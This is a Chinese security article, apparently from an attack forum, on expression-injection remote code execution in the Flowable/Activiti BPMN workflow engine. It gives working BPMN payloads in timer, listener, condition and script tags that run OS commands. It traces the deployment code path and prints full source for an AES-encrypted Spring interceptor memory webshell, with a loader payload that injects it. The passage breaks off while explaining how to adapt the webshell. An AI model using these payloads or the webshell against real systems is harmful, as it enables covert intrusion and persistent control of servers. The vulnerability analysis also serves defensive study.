Flowable简介
----------

Flowable 是一个用 Java 编写的轻量级业务流程引擎。Flowable 流程引擎允许您部署 BPMN 2.0 流程定义（用于定义流程的行业 XML 标准）、创建这些流程定义的流程实例、运行查询、访问活动或历史流程实例和相关数据等等。

在将 Flowable 添加到您的应用程序/服务/架构中时，它非常灵活。您可以通过包含以 JAR 形式提供的 Flowable 库将引擎*嵌入*到您的应用程序或服务中。由于它是一个 JAR，因此您可以轻松地将其添加到任何 Java 环境中：Java SE；servlet 容器，例如 Tomcat 或 Jetty、Spring；Java EE 服务器，例如 JBoss 或 WebSphere 等等。或者，您可以使用 Flowable REST API 通过 HTTP 进行通信。还有几个 Flowable 应用程序（Flowable Modeler、Flowable Admin、Flowable IDM 和 Flowable Task），它们提供了用于处理流程和任务的现成示例 UI。

所有设置 Flowable 的方法都具有核心引擎，它可以看作是一组服务，这些服务公开 API 来管理和执行业务流程。

### Flowable 和 Activiti

Flowable 是 Activiti（Alfresco 的注册商标）的一个分支。这两个其实区别不大，可能在标签名称上会有一些变化，但造成漏洞的点基本相同。

### 环境搭建

环境搭建的具体步骤参见下面的链接  
[SpringBoot + Flowable并集成ui](https://mp.weixin.qq.com/s/yDUHeD8O1mLbNKXeV1wZbA)

### 表达式

Flowable 使用[统一表达式语言 (UEL)](https://javaee.github.io/tutorial/jsf-el.html)来解析表达式。UEL 的文档是语法和可用运算符的良好参考。每个表达式都以 开头`${`并以 结尾`}`。

表达式有两种类型：

- **值表达式**提供一个值。支持的值包括布尔值、字符串、整数、浮点数和 null。典型的值表达式是`${variable.property}`或`${bean.property}`。
- **方法表达式**可以调用带参数或不带参数的方法。方法表达式的一个示例是`${bean.setPropertyValue('newValue')}`。要区分值表达式和不带任何参数的方法表达式，请在方法调用末尾使用空括号。例如，`${variable.toString()}`。

理论上，任何暴露给应用程序的 Spring bean 都可以用于后端表达式，但并非所有类都能以允许正确表达式评估的方式进行序列化。

标签简介
----

介绍一些常用于漏洞利用的标签

### `<timerEventDefinition>`

- **用途**: `<timerEventDefinition>` 标签用于定义一个定时器事件。它可以在多种场景中使用，如中间定时器事件、边界定时器事件、开始定时器事件等。
- **场景**: 
    - **开始事件**: 定时器事件可以作为流程的开始事件，表示流程将在特定时间或间隔后启动。
    - **中间事件**: 定时器事件可以用作中间事件，表示流程需要等待一段时间后继续执行。
    - **边界事件**: 定时器事件可以附加到某个活动（如用户任务）上，表示在指定时间后触发特定行为（如任务超时处理）。

#### `<timeDuration>`

- **用途**: `<timeDuration>` 标签定义了一个时间间隔，用于指定定时器触发的延迟时间。这是 `ISO-8601` 标准格式的字符串，表示一个时间段，例如 `PT5M` 表示 5 分钟。同时支持表达式方式

```xml
<!-- 处于startEvent标签中 -->
<timerEventDefinition>
    <timeDuration>
       ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}
    </timeDuration>
</timerEventDefinition>
```

对应 在 Flowable Web Modeler (这个是Flowable官方提供的一个Web页面，方便自定义流程)中的位置  
![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-6736851efdc7849a682d3bc9c2f3b5a627682c56.png)

#### `<timeCycle>`

`<timeCycle>` 标签可以用于定义一个周期性的定时器，表达式可以动态生成一个周期表达式

```xml
<!-- timeCycle直接使用function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\') -->
<!-- 会抛出类型错误 -->
<timerEventDefinition>
  <timeCycle>
    ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){return java.lang.Runtime.getRuntime().exec(\'calc\')};test()')}
  </timeCycle>
</timerEventDefinition>
```

对应 在 Flowable Web Modeler 中的位置  
![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-2e4a40b3fc1a283b89436a15040d7082ee29c0a8.png)

#### `<timeDate>`

`<timeDate>` 标签可以用于指定一个具体的触发日期时间。

```xml
<timerEventDefinition>
    <timeDate>
        ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}
    </timeDate>
</timerEventDefinition>
```

对应 在 Flowable Web Modeler 中的位置  
![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-a8e198f5d269bb7d76215c366be935b202096ab8.png)

### `<extensionElements>`

该标签是 BPMN 2.0 规范中的标准标签，允许在标准 BPMN 元素上添加自定义的扩展。Flowable 通过这个标签支持许多自定义元素，例如监听器、字段、脚本等。

#### `<flowable:executionListener>`

是 Flowable 的扩展标签，允许你在流程的某些执行点（如开始、结束、任务到达时等）触发自定义代码。这个标签通常用于监听并处理流程中的执行事件，定义特定的业务逻辑。

```xml
<flowable:executionListener event="start" expression="${&#34;&#34;.getClass().forName(&#34;javax.script.ScriptEngineManager&#34;).newInstance().getEngineByName(&#34;js&#34;).eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}">
</flowable:executionListener>
```

对应 在 Flowable Web Modeler 中的位置

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-cf72ee0f7f02fed714aee30afc7cc4be02b61fc1.png)

### `<sequenceFlow>`

该标签用于定义流程中的顺序连接，它连接两个流程元素，比如活动（Activity）、网关（Gateway）或事件（Event），并指定流程的执行路径。 其中该标签中有个关键点**条件流**（ 可以通过定义条件表达式【如 UEL 表达式】来控制何时执行该流）

#### `<conditionExpression>`

该标签在 BPMN 中用于定义条件表达式，用来控制流程流转路径。它通常与 `` 标签配合使用

```xml
<!-- 执行UEL表达式时，可以不加xsi:type="tFormalExpression" -->
<sequenceFlow id="flow1" sourceRef="startEvent1" targetRef="startEvent1">
  <conditionExpression xsi:type="tFormalExpression"><![CDATA[${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}]]></conditionExpression>
</sequenceFlow>
```

对应 在 Flowable Web Modeler 中的位置  
![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-6a59b20d523ec8b3b3782c99a3f237266339b530.png)

### `<scriptTask>`

是 Flowable 用于执行脚本代码的任务节点。它允许在流程运行期间执行任意脚本语言的代码，例如 JavaScript、Groovy、Python 等。

#### `<script>`

```xml
<scriptTask id="scriptTask1" scriptFormat="groovy">
  <script>
    <![CDATA[
      'calc'.execute()
    ]]>
  </script>
</scriptTask>
<!-- 注意，需要有步骤引用了定义的脚本任务scriptTask -->
<sequenceFlow sourceRef="startEvent1" targetRef="scriptTask1"/>
```

```xml
<scriptTask id="scriptTask1" scriptFormat="groovy">
    <script>
        a=java.lang.Runtime.getRuntime().exec("calc")
    </script>
</scriptTask>
<!-- 注意，需要有步骤引用了定义的脚本任务scriptTask -->
<sequenceFlow sourceRef="startEvent1" targetRef="scriptTask1"/>
```

当然还有很多其他利用的标签，这里只列举了一些较为常用的

漏洞分析
----

### 流程部署时能够解析表达式的标签

```text
<timeDuration>
<timeCycle>
<timeDate>
....
```

此处以`<timeDuration>`标签为例，分析一下程序流程

```java
// 获取默认的流程引擎
ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();

// 获取 RepositoryService
RepositoryService repositoryService = processEngine.getRepositoryService();

// 部署流程定义
repositoryService.createDeployment()
.addClasspathResource(file + ".bpmn20.xml")
.deploy();
```

测试Poc如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"
  xmlns:activiti="http://activiti.org/bpmn"
  typeLanguage="http://www.w3.org/2001/XMLSchema"
  expressionLanguage="http://www.w3.org/1999/XPath"
  targetNamespace="http://www.activiti.org/test">

  <process id="meeting" name="meeting" isExecutable="true">
    <startEvent id="startEvent1" name="Start" activiti:initiator="host">
      <timerEventDefinition>
        <timeDuration>
          ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}
        </timeDuration>
      </timerEventDefinition>
    </startEvent>
    <userTask id="userTask2" name="meeting2" activiti:assignee="${person}" activiti:formKey="meeting/signate">
      <multiInstanceLoopCharacteristics isSequential="false" activiti:collection="people"
        activiti:elementVariable="person"></multiInstanceLoopCharacteristics>
    </userTask>

    <userTask id="usertask3" name="meeting3" activiti:assignee="${host}" activiti:formKey="meeting/input">

    </userTask>

  </process>

</definitions>
```

在`deploy()`方法处下断

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-e064e077c500a50263776afe792dffb100635074.png)  
经过重载，来到`org.flowable.engine.impl.RepositoryServiceImpl#deploy`

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-318c17f674ab70951aeeaa3c2cc61e4499ae2dd0.png)  
来到`org.flowable.common.engine.impl.cfg.CommandExecutorImpl#execute(org.flowable.common.engine.impl.interceptor.CommandConfig, org.flowable.common.engine.impl.interceptor.Command)`准备执行拦截器  
![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-2d076e762c62fe6ebeea0a19b9bc7e6f818fa13a.png)  
`org.flowable.common.engine.impl.interceptor.LogInterceptor`该拦截器很明显是日志  
`org.flowable.common.spring.SpringTransactionInterceptor`该拦截器主要作用是通过 Spring 的事务管理器确保 Flowable 中的命令在事务范围内执行。  
`org.flowable.common.engine.impl.interceptor.CommandContextInterceptor`该拦截器的核心作用是管理 `CommandContext` 的生命周期。它确保在执行命令时，Flowable 引擎能够正确管理上下文和资源，并在命令执行完毕后进行清理  
`org.flowable.common.engine.impl.interceptor.TransactionContextInterceptor`该拦截器是 `Flowable`引擎中用于管理事务上下文的拦截器。它确保在命令执行过程中，所有数据库操作都在事务的范围内执行，提供了强大的事务管理能力，确保命令执行的原子性、一致性、隔离性和持久性  
`org.flowable.engine.impl.interceptor.BpmnOverrideContextInterceptor`要作用是为 BPMN 执行提供一个上下文，用于处理在流程实例运行时需要覆盖的 BPMN 行为或定义。该拦截器允许在流程实例执行期间自定义和覆盖 BPMN 的某些行为，比如扩展的执行逻辑或流程定义的某些元素。  
以上便是默认情况下，整个flowable的拦截器链，因为无需具体分析拦截器链中做了什么，所以只是进行简单的描述，拦截器执行完成后来到`org.flowable.engine.impl.interceptor.CommandInvoker#execute`

```java
public  T execute(final CommandConfig config, final Command command, CommandExecutor commandExecutor) {
    // 获取当前线程中的 CommandContext，该CommandContext会在的整个部署生命周期中被共享和复用。
    final CommandContext commandContext = Context.getCommandContext();
    // 获取当前 CommandContext 中的调度器，负责调度和执行流程中的操作，同样包括对表达式的处理
    FlowableEngineAgenda agenda = CommandContextUtil.getAgenda(commandContext);
    // 当commandContext被复用时进入
    if (commandContext.isReused() &amp;&amp; !agenda.isEmpty()) { // there is already an agenda loop being executed
        return (T) command.execute(commandContext);

    } else {

        // 计划执行,因为Flowable 采用了 lazy execution 模式，即命令不会立刻执行，而是通过 agenda 计划后，按需执行。
        agenda.planOperation(new Runnable() {
            @Override
            public void run() {
                commandContext.setResult(command.execute(commandContext));
            }
        });

        // 执行 agenda 中的操作。
        executeOperations(commandContext);

        ....
    }
}
```

来到`org.flowable.engine.impl.interceptor.CommandInvoker#executeOperations`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-18d7fd523ca29f8db60ac25f8ff347e1c30b6b9a.png)  
然后在`executeOperation(commandContext, runnable)`中调用`runnable.run`方法执行相关操作  
![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-a73ef3ea7b1bbb5c3039380b6ae30f57fa03dca6.png)  
继续跟进command.execute()方法，来到`org.flowable.engine.impl.cmd.DeployCmd#execute`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-19be4da3c53e3e64d4985a7f0a962d390ca16582.png)

`org.flowable.engine.impl.cmd.DeployCmd#executeDeploy`

```java
protected Deployment executeDeploy(CommandContext commandContext) {
    // 获取部署的实例，其中存储这当前bpmn文件所设置的流程
    DeploymentEntity deployment = deploymentBuilder.getDeployment();
    // 获取流程引擎的配置信息，设置部署时间
    ProcessEngineConfigurationImpl processEngineConfiguration = CommandContextUtil.getProcessEngineConfiguration(commandContext);
    deployment.setDeploymentTime(processEngineConfiguration.getClock().getCurrentTime());
    // 重复部署过滤，默认为false,所以此处暂且忽略
    if (deploymentBuilder.isDuplicateFilterEnabled()) {...}

    // 标记 deployment 为新的部署，并通过 DeploymentEntityManager 将其插入数据库。
    deployment.setNew(true);
    processEngineConfiguration.getDeploymentEntityManager().insert(deployment);
    // 如果 deployment 没有设置父部署 ID，则将当前部署的 ID 设置为父部署 ID
    if (StringUtils.isEmpty(deployment.getParentDeploymentId())) {
        deployment.setParentDeploymentId(deployment.getId());
    }
    // 触发 ENTITY_CREATED 事件，flowable引擎内部事件
    FlowableEventDispatcher eventDispatcher = processEngineConfiguration.getEventDispatcher();
    if (eventDispatcher != null &amp;&amp; eventDispatcher.isEnabled()) {
        eventDispatcher.dispatchEvent(FlowableEventBuilder.createEntityEvent(FlowableEngineEventType.ENTITY_CREATED, deployment),
                                      processEngineConfiguration.getEngineCfgKey());
    }

    // 流程实例部署的设置
    Map deploymentSettings = new HashMap&lt;&gt;();
    deploymentSettings.put(DeploymentSettings.IS_BPMN20_XSD_VALIDATION_ENABLED, deploymentBuilder.isBpmn20XsdValidationEnabled());
    deploymentSettings.put(DeploymentSettings.IS_PROCESS_VALIDATION_ENABLED, deploymentBuilder.isProcessValidationEnabled());

    // 执行部署
    processEngineConfiguration.getDeploymentManager().deploy(deployment, deploymentSettings);

    // 如果部署中设置了流程定义的激活时间，则会调用 scheduleProcessDefinitionActivation 方法
    // 设置相应的流程定义激活计划。
    if (deploymentBuilder.getProcessDefinitionsActivationDate() != null) {
        scheduleProcessDefinitionActivation(commandContext, deployment);
    }

    // 署完成后，会触发 ENTITY_INITIALIZED 事件，告知监听器部署实体已初始化完成。
    if (eventDispatcher != null &amp;&amp; eventDispatcher.isEnabled()) {
        eventDispatcher.dispatchEvent(FlowableEventBuilder.createEntityEvent(FlowableEngineEventType.ENTITY_INITIALIZED, deployment),
                                          processEngineConfiguration.getEngineCfgKey());
    }

    return deployment;
}
```

到这，才算是真正的开始部署流程，前面的都是一些配置相关的，跟进来到`org.flowable.engine.impl.persistence.deploy.DeploymentManager#deploy(org.flowable.engine.impl.persistence.entity.DeploymentEntity, java.util.Map)`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-99829dff19e34dffe1acef77cc0875f3c5724225.png)  
因为这里部署的是bpmn20.xml文件，所以直接跟进BpmnDeployer对象的deploy方法即可`org.flowable.engine.impl.bpmn.deployer.BpmnDeployer#deplom`

```java
public void deploy(EngineDeployment deployment, Map deploymentSettings) {

    // 解析 BPMN 文件并生成相应的对象模型
    ParsedDeployment parsedDeployment = parsedDeploymentBuilderFactory
    .getBuilderForDeploymentAndSettings(deployment, deploymentSettings)
    .build();

    // 保证流程定义必须有唯一的 key
    bpmnDeploymentHelper.verifyProcessDefinitionsDoNotShareKeys(parsedDeployment.getAllProcessDefinitions());
    // 将部署的相关值（部署时间、部署 ID 等）复制到流程定义对象中。
    bpmnDeploymentHelper.copyDeploymentValuesToProcessDefinitions(
        parsedDeployment.getDeployment(), parsedDeployment.getAllProcessDefinitions());
    // 设置流程定义资源的名称
    bpmnDeploymentHelper.setResourceNamesOnProcessDefinitions(parsedDeployment);
    // 创建并保存流程图，并设置流程图的名称
    createAndPersistNewDiagramsIfNeeded(parsedDeployment);
    setProcessDefinitionDiagramNames(parsedDeployment);

    if (deployment.isNew()) {   // 如果该流程是新部署的进入
        // 检查是否是派生部署，不是的话进入if
        if (!deploymentSettings.containsKey(DeploymentSettings.IS_DERIVED_DEPLOYMENT)) {
            // 查找当前部署中所有流程定义的前一版本，这个是flowable对同一个流程图会有多个版本
            Map mapOfNewProcessDefinitionToPreviousVersion = getPreviousVersionsOfProcessDefinitions(parsedDeployment);
            // 设置版本号和 ID
            setProcessDefinitionVersionsAndIds(parsedDeployment, mapOfNewProcessDefinitionToPreviousVersion);
            // 新的流程定义存到数据库
            persistProcessDefinitionsAndAuthorizations(parsedDeployment);
            // 更新定时器和时间
            updateTimersAndEvents(parsedDeployment, mapOfNewProcessDefinitionToPreviousVersion);

        } else {    // 派生部署一般不会走到，但其实与上面的区别也不大
            Map mapOfNewProcessDefinitionToPreviousDerivedVersion = 
            getPreviousDerivedFromVersionsOfProcessDefinitions(parsedDeployment);
            setDerivedProcessDefinitionVersionsAndIds(parsedDeployment, mapOfNewProcessDefinitionToPreviousDerivedVersion, deploymentSettings);
            persistProcessDefinitionsAndAuthorizations(parsedDeployment);
        }

    } else {...}
    // 更新系统缓存和工件（如流程定义和流程图）
    cachingAndArtifactsManager.updateCachingAndArtifacts(parsedDeployment);

    if (deployment.isNew()) {   // 触发 ENTITY_INITIALIZED 事件，通知其他组件流程定义已成功初始化。
        dispatchProcessDefinitionEntityInitializedEvent(parsedDeployment);
    }
    // 创建流程定义的本地化值，用于支持流程定义的多语言和区域设置。
    for (ProcessDefinitionEntity processDefinition : parsedDeployment.getAllProcessDefinitions()) {
        BpmnModel bpmnModel = parsedDeployment.getBpmnModelForProcessDefinition(processDefinition);
        createLocalizationValues(processDefinition.getId(), bpmnModel.getProcessById(processDefinition.getKey()));
    }
}
```

前面bpmn20.xml文件中的poc是在`timeDuration`标签中的，所以跟进到`org.flowable.engine.impl.bpmn.deployer.BpmnDeployer#updateTimersAndEvents`，还有`<timeCycle>`和`<timeData>`等分支，但后面的代码基本一样，所以此处选一个分支进入即可  
![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-7206dd2b7afbd4fcaa1370b8668cd625a31d52f1.png)

`org.flowable.engine.impl.bpmn.deployer.BpmnDeploymentHelper#updateTimersAndEvents`

```java
public void updateTimersAndEvents(ProcessDefinitionEntity processDefinition,
                                  ProcessDefinitionEntity previousProcessDefinition, ParsedDeployment parsedDeployment) {
    // 获取流程模型和 BPMN 模型，其中存储了整个流程的所有内容
    Process process = parsedDeployment.getProcessModelForProcessDefinition(processDefinition);
    BpmnModel bpmnModel = parsedDeployment.getBpmnModelForProcessDefinition(processDefinition);
    // 移除旧版本中的事件订阅
    eventSubscriptionManager.removeObsoleteMessageEventSubscriptions(previousProcessDefinition);
    eventSubscriptionManager.removeObsoleteSignalEventSubScription(previousProcessDefinition);
    eventSubscriptionManager.removeObsoleteEventRegistryEventSubScription(previousProcessDefinition);
    // 添加新版本中的事件订阅
    eventSubscriptionManager.addEventSubscriptions(processDefinition, process, bpmnModel);
    // 移除旧版本中的定时器
    timerManager.removeObsoleteTimers(processDefinition);
    timerManager.scheduleTimers(processDefinition, process);    // 为新版本安排定时器
}
```

`org.flowable.engine.impl.bpmn.deployer.TimerManager#scheduleTimers`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-20dcfe785c2688e6a8c274996f74d0da532cb919.png)

`org.flowable.engine.impl.bpmn.deployer.TimerManager#getTimerDeclarations`

```java
protected List getTimerDeclarations(ProcessDefinitionEntity processDefinition, Process process) {
    List timers = new ArrayList&lt;&gt;();
    // 检查流程中是否定义了启动事件、任务、网关等流程元素
    if (CollectionUtil.isNotEmpty(process.getFlowElements())) {
        for (FlowElement element : process.getFlowElements()) {
            // 如果是启动事件的话进入，这也解释了上面poc的定义在中
            if (element instanceof StartEvent) {    
                StartEvent startEvent = (StartEvent) element;
                if (CollectionUtil.isNotEmpty(startEvent.getEventDefinitions())) {  // 检查是否有事件定义
                    EventDefinition eventDefinition = startEvent.getEventDefinitions().get(0);  // 获取启动事件中的第一个事件
                    if (eventDefinition instanceof TimerEventDefinition) {  // 若是时间相关事件，则进入
                        TimerEventDefinition timerEventDefinition = (TimerEventDefinition) eventDefinition;
                        // 创建定时任务实体，该步骤中会解析定时任务中的表达式
                        TimerJobEntity timerJob = TimerUtil.createTimerEntityForTimerEventDefinition(timerEventDefinition, startEvent,
                                                                                                     false, null, TimerStartEventJobHandler.TYPE, TimerEventHandler.createConfiguration(startEvent.getId(), 
                                                                                                                                                                                        timerEventDefinition.getEndDate(), timerEventDefinition.getCalendarName()));

                        if (timerJob != null) {
                            timerJob.setProcessDefinitionId(processDefinition.getId());

                            if (processDefinition.getTenantId() != null) {
                                timerJob.setTenantId(processDefinition.getTenantId());
                            }
                            timers.add(timerJob);
                        }

                    }
                }
            }
        }
    }

    return timers;
}
```

来到`org.flowable.engine.impl.util.TimerUtil#createTimerEntityForTimerEventDefinition`

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-ad5f73369990e63899a4156368211ee6b8cb3181.png)  
到这里就已经知道了表达式的执行点，当然，这只是其中一个标签中表达式的执行点，还有很多标签支持表达式，所执行表达式的地方也就不一样了。

总结一下：整个步骤中并没有什么坑点，只是单纯的解析bpmn20.xml文件的步骤，唯一需要注意的是不同标签的表达式所执行的地方不同，所以漏洞触发的时机不同，有些在流程部署时就会执行，有些则是在流程启动，或者流程真正被分配时才会执行。比如上面例子中的`<timeDuration>`标签，它在流程部署的时候是因为应用程序需要知道该流程需要间隔多少时间启动一次，所以在deploy时就会进行解析执行。

### 流程启动时能够解析表达式的标签

```text
<flowable:executionListener>
<conditionExpression>
<script>
...
```

这里其实就是和上面基本差不多了，区别也就是执行的点不一样，所以就不在进行分析了

ProcessEngineFactoryBean
------------------------

当使用spring+flowable和ProcessEngineFactoryBean时，默认BPMN流程中所有的[表达式](https://tkjohn.github.io/flowable-userguide/#apiExpressions)都可以“看见”所有的Spring bean。翻译一下：在默认情况下，可以在bpmn20.xml中的表达式，可以直接访问Spring bean中所有的public方法，也就是可以访问`SpringBoot`中所有使用`@Bean`、`@Component`、`@Controller`等注解定义所有类中的public方法。  
例如：自己定义了一个bean，并将其添加到Spring Beans中

```java
@Component
public class MyBeans {
    public static void sayHello(String cmd) {
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

```xml
<timerEventDefinition>
  <timeDuration>
    ${javaBeans.sayHello('calc')}
  </timeDuration>
</timerEventDefinition>
```

而这种写法就能够调用到MyBeans里面的sayHello方法，而在这种默认情况下，又有哪些beans能够被访问呢,直接跟进代码来到`org.flowable.common.engine.impl.javax.el.CompositeELResolver#getValue`  
此处是查找javaBeans，从这8个resolvers中获取

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-32f67c4fb60841796f0143c85b903d2aaaecea96.png)

重点来看第二个resolvers

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-8eb4f225934b4ab74209dec40aeaccd1fd2d0f83.png)

继续向下跟，会来到`org.springframework.beans.factory.support.AbstractBeanFactory#doGetBean`，然后根据传入的name，寻找是否有匹配的类

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-8791e6d2ee8095d645fb65ea40e0faeb6af31f6a.png)

到这里，就算是能够获取到springboot中的大多数对象了，接下来只需要在这些对象中寻找一个可以利用的点即可，例如先访问一下`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#getModelAndViewResolvers`这个方法做个示例

```xml
<timeDuration>
  ${requestMappingHandlerAdapter.getModelAndViewResolvers()}
</timeDuration>
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-b8009dba2c84e19da515a7fef5ebe0633b7f68c1.png)

接下来就是需要找到一个可以利用的方法了，可是我太菜了，没有找到好的利用点  
**要完全禁止表达式使用bean，可以将SpringProcessEngineConfiguration的‘beans’参数设为空list。如果不设置‘beans’参数，则上下文中的所有bean都将可以使用。**

注入内存马
-----

那么如何利用该漏洞注入内存马呢  
这里以springboot为例，注入spring拦截器型内存马  
之前已经有了spring拦截器内存马的例子，所以此处只需要实现，并修改一些未知的问题即可  
下面是原版的马子

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.List;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.handler.MappedInterceptor;
import sun.misc.BASE64Decoder;

public class A12345 extends AbstractTranslet implements HandlerInterceptor {
    public A12345() {
    }

    public void transform(DOM var1, SerializationHandler[] var2) throws TransletException {
    }

    public void transform(DOM var1, DTMAxisIterator var2, SerializationHandler var3) throws TransletException {
    }

    public boolean preHandle(HttpServletRequest var1, HttpServletResponse var2, Object var3) throws Exception {
        if (var1.getMethod().equals("POST")) {
            Field var4 = ((RequestFacade)var1).getClass().getDeclaredField("request");
            var4.setAccessible(true);
            Request var5 = (Request)var4.get(var1);
            Response var6 = var5.getResponse();
            HttpSession var7 = var5.getSession();
            HashMap var8 = new HashMap();
            var8.put("request", var5);
            var8.put("response", var6);
            var8.put("session", var7);
            String var9 = "47bce5c74f589f48";
            var7.putValue("u", var9);
            Cipher var10 = Cipher.getInstance("AES");
            var10.init(2, new SecretKeySpec(var9.getBytes(), "AES"));
            ClassLoader var11 = Thread.currentThread().getContextClassLoader();
            Class var12 = Class.forName("java.lang.ClassLoader");
            Method var13 = var12.getDeclaredMethod("defineClass", String.class, byte[].class, Integer.TYPE, Integer.TYPE);
            var13.setAccessible(true);
            byte[] var14 = var10.doFinal((new BASE64Decoder()).decodeBuffer(var5.getReader().readLine()));
            Class var15 = (Class)var13.invoke(var11, null, var14, 0, var14.length);
            var15.newInstance().equals(var8);
            return false;
        } else {
            return true;
        }
    }

    static {
        try {
            Field var0 = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
            var0.setAccessible(true);
            WebApplicationContext var1 = (WebApplicationContext)((LinkedHashSet)var0.get((Object)null)).iterator().next();
            AbstractHandlerMapping var2 = (AbstractHandlerMapping)var1.getBean("requestMappingHandlerMapping");
            Field var3 = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            var3.setAccessible(true);
            Object var4 = var3.get(var2);
            ((List)var4).add(0, new MappedInterceptor(new String[]{"/login"}, (String[])null, new A12345()));
            var3.set(var2, var4);
            AbstractHandlerMapping var5 = (AbstractHandlerMapping)var1.getBean("resourceHandlerMapping");
            Object var6 = var3.get(var2);
            ((List)var6).add(0, new MappedInterceptor(new String[]{"/login"}, (String[])null, new A12345()));
            var3.set(var5, var6);
        } catch (Exception var8) {
            var8.printStackTrace();
        }

    }
}
```

### 表达式加载class

```xml
<?xml version="1.0" encoding="UTF-8"?>
<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"
  xmlns:activiti="http://activiti.org/bpmn"
  typeLanguage="http://www.w3.org/2001/XMLSchema"
  expressionLanguage="http://www.w3.org/1999/XPath"
  targetNamespace="http://www.activiti.org/test">

  <process id="meeting" name="meeting" isExecutable="true">
    <startEvent id="startEvent1" name="Start" activiti:initiator="host">
      <timerEventDefinition>
        <!-- 使用flowable注入内存马，默认连接密码rebeyond -->
        <!-- 其中实现类为A12345 -->
        <timeDuration>
          ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('
            var contextClassLoader = java.lang.Thread.currentThread().getContextClassLoader();
            var bytecodeBase64 = \'yv66vgAAADQBTQoAVQCt...[指定class的base64编码]\';
            var bytecode;
            try {
              var clsString = contextClassLoader.loadClass(\'java.lang.String\');
              var clsBase64 = contextClassLoader.loadClass(\'java.util.Base64\');
              var clsDecoder = contextClassLoader.loadClass(\'java.util.Base64$Decoder\');
              var decoder = clsBase64.getMethod(\'getDecoder\').invoke(null);
              bytecode = clsDecoder.getMethod(\'decode\',clsString).invoke(decoder,bytecodeBase64);
              var clsClassLoader = contextClassLoader.loadClass(\'java.lang.ClassLoader\');
              var clsByteArray = (new java.lang.String(\'c\').getBytes().getClass());
              var clsInt = java.lang.Integer.TYPE;
              var defineClass = clsClassLoader.getDeclaredMethod(\'defineClass\', [clsByteArray, clsInt, clsInt]);
              defineClass.setAccessible(true);
              java.lang.System.out.println(222);
              java.lang.System.out.println(bytecode.getClass().getName());
              var clazz = defineClass.invoke(contextClassLoader, bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length));
              java.lang.System.out.println(111);
              clazz.newInstance();
            } catch (ee) {
              java.lang.System.out.println(ee);
              ee.printStackTrace();
            }
          ')}
        </timeDuration>
      </timerEventDefinition>
    </startEvent>
    <userTask id="userTask2" name="meeting2" activiti:assignee="${person}" activiti:formKey="meeting/signate">
      <multiInstanceLoopCharacteristics isSequential="false" activiti:collection="people"
        activiti:elementVariable="person"></multiInstanceLoopCharacteristics>
        </userTask>

        <userTask id="usertask3" name="meeting3" activiti:assignee="${host}" activiti:formKey="meeting/input">

        </userTask>

    </process>

</definitions>
```

### 修改内存马

直接使用原版的内存马时，会遇到两个问题

1. SpringBoot+Flowable的项目中，`org.springframework.context.support.LiveBeansView#applicationContexts`字段中存在多个`ConfigurableApplicationContext`对象，导致原本的注入无法准确注入
